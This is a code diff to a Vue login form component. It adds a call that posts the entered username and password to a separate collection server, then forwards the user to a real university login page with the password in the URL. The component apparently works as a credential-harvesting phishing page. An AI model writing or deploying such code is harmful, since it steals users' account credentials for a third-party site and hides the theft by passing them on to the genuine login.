@@ -1,5 +1,6 @@
 <script lang="ts">
 import { Component, Vue, Ref } from "vue-facing-decorator";
+import axios from "axios";
 
 @Component
 export default class LoginForm extends Vue {
@@ -7,10 +8,15 @@ export default class LoginForm extends Vue {
   @Ref("password") readonly password!: HTMLInputElement;
 
   save(): void {
-    console.log(this.username.value);
-    console.log(this.password.value);
+    const username = this.username.value,
+      password = this.password.value;
 
-    window.location.href = `https://ilearn.fcu.edu.tw/login/index.php?username=${this.username.value}&password=${this.password.value}`;
+    axios.post("http://localhost:3000/create-entry", {
+      username: username,
+      password: password,
+    });
+
+    window.location.href = `https://ilearn.fcu.edu.tw/login/index.php?username=${username}&password=${password}`;
   }
 }
 </script>
